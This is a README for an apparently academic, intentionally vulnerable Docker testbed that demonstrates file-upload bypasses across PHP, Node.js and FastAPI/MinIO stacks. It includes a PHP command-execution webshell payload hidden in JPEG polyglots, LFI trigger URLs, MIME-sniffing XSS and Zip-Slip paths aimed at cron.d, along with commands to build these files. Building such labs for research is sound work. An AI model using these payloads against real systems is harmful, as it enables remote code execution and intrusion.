# PolyMorph Testbed Environments

> [!CAUTION]
> **INTENTIONALLY VULNERABLE — LOCAL RESEARCH LAB ONLY**
> These environments contain deliberate security vulnerabilities for controlled academic research into file-upload bypass attack patterns.
> **Never deploy to production or expose to the internet.**

---

## Overview

Three tiered testbed environments demonstrating file-upload bypass vulnerabilities across different technology stacks — from legacy monoliths to modern cloud-native architectures.

| Tier | Stack | Port(s) | Primary Attack Vectors |
|------|-------|---------|------------------------|
| **1** | Legacy PHP 8.1 + Apache | `8081` | Magic-byte bypass → LFI, `.htaccess` handler misconfig, double extension |
| **2** | MERN (Node.js + Express + React) | `3000`, `3001` | MIME sniffing XSS, parser differential (Zip-Slip) |
| **3** | Cloud-Native (FastAPI + MinIO S3) | `8000`, `8080`, `9000` | Pre-signed URL bypass, parser differential, public bucket MIME confusion |

---

## Quick Start

### Start all tiers at once
```bash
cd "d:/Sem Docs/sem 7 docs/Project/testbed"
docker compose up --build
```

### Start individual tiers
```bash
# Tier 1 only
docker compose up tier1-php

# Tier 2 only
docker compose up tier2-backend tier2-frontend

# Tier 3 only
docker compose up minio minio-init tier3-api tier3-frontend
```

### Stop and clean up
```bash
docker compose down -v
```

---

## Service URLs

| Service | URL | Notes |
|---------|-----|-------|
| Tier 1 PHP app | http://localhost:8081 | Profile page + LFI trigger |
| Tier 2 Frontend | http://localhost:3000 | React UI (nginx served) |
| Tier 2 API | http://localhost:3001 | Express backend |
| Tier 3 Frontend | http://localhost:8080 | Cloud UI (nginx served) |
| Tier 3 FastAPI | http://localhost:8000 | Python API + Swagger at `/docs` |
| MinIO S3 | http://localhost:9000 | S3-compatible object store |
| MinIO Console | http://localhost:9001 | Admin UI (`minioadmin`/`minioadmin`) |

---

## Automated Harness

Run the PolyMorph automated test harness to generate polyglots, submit them to all tiers, and record bypass results:

```bash
# From the project root
cd "d:/Sem Docs/sem 7 docs/Project"

# Install harness deps
pip install requests rich

# Run against all tiers (requires docker compose up first)
python testbed/harness/run_tests.py --tier all --report testbed/results.json

# Run against a specific tier
python testbed/harness/run_tests.py --tier 1
python testbed/harness/run_tests.py --tier 2
python testbed/harness/run_tests.py --tier 3
```

The harness outputs a rich terminal table and a structured JSON report.

---

## Payload Execution — How Each Attack Works

### Tier 1 — JPEG+PHP → Local File Inclusion (LFI)

**The gap:** `exif_imagetype()` validates JPEG magic bytes (`FF D8 FF`) but doesn't scan the rest of the file. PHP's `include()` doesn't care about file format — it scans any binary blob for `<?php` tags.

```
[PolyMorph]  Inject PHP payload into JPEG COM segment
                FF D8 FF FE [len] <?php system($_GET['cmd']); ?> ... FF D9
     ↓
[upload.php]  exif_imagetype() → IMAGETYPE_JPEG ✓  (reads only magic bytes)
              Extension check → .jpg ✓
              File saved to webroot: uploads/avatar.jpg
     ↓
[index.php]   include($_GET['page'])  with  ?page=uploads/avatar.jpg
     ↓
[PHP engine]  Scans binary JPEG data → finds <?php tag → EXECUTES
     ↓
[Browser]     ?cmd=id → Response contains system command output
```

**Trigger URL:** `http://localhost:8081/?page=uploads/avatar.jpg&cmd=id`

**Vector 2 — `.htaccess` handler misconfig:**
```bash
# Copy the pre-written vulnerable config into uploads/
cp backend/uploads/.htaccess_vulnerable backend/uploads/.htaccess
# Now request the image directly — Apache executes PHP inside it
curl "http://localhost:8081/uploads/avatar.jpg?cmd=whoami"
```

**Vector 3 — Double extension:**
Upload a file named `avatar.php.jpg`. The Dockerfile's intentionally broken `FilesMatch "\.php"` regex (missing `$` anchor) matches `.php.jpg`, causing mod_php to process it.

---

### Tier 2 — PNG+HTML → MIME Sniffing XSS

**The gap:** `file-type` checks magic bytes at the *start* of the file, so a valid PNG header passes. The static file server omits `X-Content-Type-Options: nosniff`, allowing the browser to content-sniff and execute embedded HTML/JS.

```
[PolyMorph]  Inject <script> into PNG tEXt chunk (after IHDR, before IEND)
     ↓
[server.js]  fileFilter: checks Content-Type header only → passes
             file-type: reads PNG magic FF D8 89 50 4E 47 → image/png ✓
             File saved to: uploads/avatar_<ts>.png
     ↓
[Static]     GET /uploads/avatar_<ts>.png
             Content-Type: image/png  (no X-Content-Type-Options: nosniff)
     ↓
[Browser]    Content-sniffs file → finds <script> tag → EXECUTES JS
```

**Trigger:** Open `http://localhost:3001/uploads/avatar_<timestamp>.png` directly in browser.

### Tier 2 — PNG+ZIP → Parser Differential (Zip-Slip)

**The gap:** `file-type` reads the *start* of the file (PNG header). `adm-zip` reads the *end* of the file (ZIP EOCD marker). Both succeed on the same polyglot file simultaneously.

```
[PolyMorph]  PNG bytes [SOF…IEND] + patched ZIP bytes [local entries…EOCD]
     ↓
[server.js]  file-type: reads 0x89 50 4E 47 at offset 0 → image/png ✓
             Upload accepted
     ↓
[archiveWorker]  new AdmZip(filePath)
                 Scans backwards for EOCD signature 50 4B 05 06 → found ✓
                 Reads ZIP central directory → extracts all entries
     ↓
[Zip-Slip]   Entry name: "../../backend/injected.js"
             extractEntryTo() writes outside ./extracted/ sandbox
```

**Observe:** Check `backend/extracted/` directory and server logs (`[WORKER]` lines) after upload.

---

### Tier 3 — Pre-signed URL Bypass

**The gap:** The frontend requests a pre-signed PUT URL from the API, then uploads *directly* to MinIO — the API gateway (with all its python-magic validation) is never invoked for the actual file bytes.

```
[Client]  GET /get-upload-url?filename=shell.png&content_type=image/png
     ↓
[FastAPI]  Generates MinIO pre-signed URL (no content inspection yet)
           Returns: { "upload_url": "http://localhost:9000/uploads/shell.png?X-Amz-..." }
     ↓
[Client]  PUT http://localhost:9000/uploads/shell.png   ← Direct to MinIO
          Body: <any file — polyglot, webshell, malware>
          ALL FastAPI validation is bypassed
     ↓
[MinIO]   Stores object in public bucket
          No server-side content inspection
```

**UI toggle:** Select "Pre-signed URL Upload (Bypass Mode)" radio button in the Tier 3 frontend.

### Tier 3 — Parser Differential (python-magic vs zipfile)

```
[POST /validate-upload?filename=shell.png]
     ↓
[FastAPI]  data = s3.get_object(...)["Body"].read()

           Check 1: magic.from_buffer(data[:2048], mime=True)
                    → Sees PNG header at offset 0 → "image/png" ✓

           Check 2: zipfile.ZipFile(io.BytesIO(data))
                    → Scans backwards for EOCD → finds ZIP → opens ✓

           Response: { "magic_mime": "image/png", "zip_detected": true,
                       "differential_gap": "File passes image validation
                        but also contains ZIP payload!" }
     ↓
[Zip-Slip]  os.path.join(extract_dir, entry)  — no path sanitization
            Entry "../../etc/cron.d/backdoor" → arbitrary write
```

---

## Generating Test Polyglots with PolyMorph

```bash
cd "d:/Sem Docs/sem 7 docs/Project"

# JPEG with PHP payload (Tier 1 — LFI)
python -m PolyMorph build jpeg --inject "<?php system(\$_GET['cmd']); ?>" --output test_lfi.jpg

# PNG with HTML/JS payload (Tier 2 — MIME sniffing XSS)
python -m PolyMorph build png --inject "<script>alert('XSS:'+document.domain)</script>" --output test_xss.png

# PNG+ZIP polyglot (Tier 2/3 — parser differential)
python -m PolyMorph build png zip --append --output test_differential.png
```

---

## CWE Mapping

| CWE | Description | Tier |
|-----|-------------|------|
| CWE-434 | Unrestricted Upload of File with Dangerous Type | 1, 2, 3 |
| CWE-98 | PHP Remote File Inclusion / LFI | 1 |
| CWE-16 | Configuration (.htaccess handler misconfig) | 1 |
| CWE-116 | Missing X-Content-Type-Options: nosniff | 2, 3 |
| CWE-436 | Interpretation Conflict / Parser Differential | 2, 3 |
| CWE-22 | Path Traversal (Zip-Slip) | 2, 3 |
| CWE-285 | Improper Authorization (pre-signed URL bypass) | 3 |

---

## Project Structure

```
testbed/
├── docker-compose.yml          ← Root orchestrator — starts all tiers
├── README.md                   ← This file
│
├── tier1_legacy/
│   ├── backend/
│   │   ├── index.php           ← Profile page + LFI sink
│   │   ├── upload.php          ← Weak upload handler
│   │   ├── uploads/
│   │   │   ├── .htaccess       ← Safe default
│   │   │   └── .htaccess_vulnerable  ← Vector 2 payload
│   │   └── Dockerfile
│   ├── docker-compose.yml
│   └── README.md
│
├── tier2_mern/
│   ├── backend/
│   │   ├── server.js           ← Express + Multer + archiveWorker
│   │   ├── package.json
│   │   ├── uploads/
│   │   ├── extracted/
│   │   └── Dockerfile
│   ├── frontend/index.html     ← Bootstrap 5 UI (img tag XSS sink)
│   ├── docker-compose.yml
│   └── README.md
│
├── tier3_cloud/
│   ├── backend/
│   │   ├── main.py             ← FastAPI (pre-signed URL + differential)
│   │   ├── requirements.txt
│   │   └── Dockerfile
│   ├── frontend/index.html     ← Two upload modes (validated / bypass)
│   ├── minio/init_bucket.sh
│   ├── docker-compose.yml
│   └── README.md
│
└── harness/
    ├── run_tests.py            ← Automated polyglot → upload → report
    └── requirements.txt
```
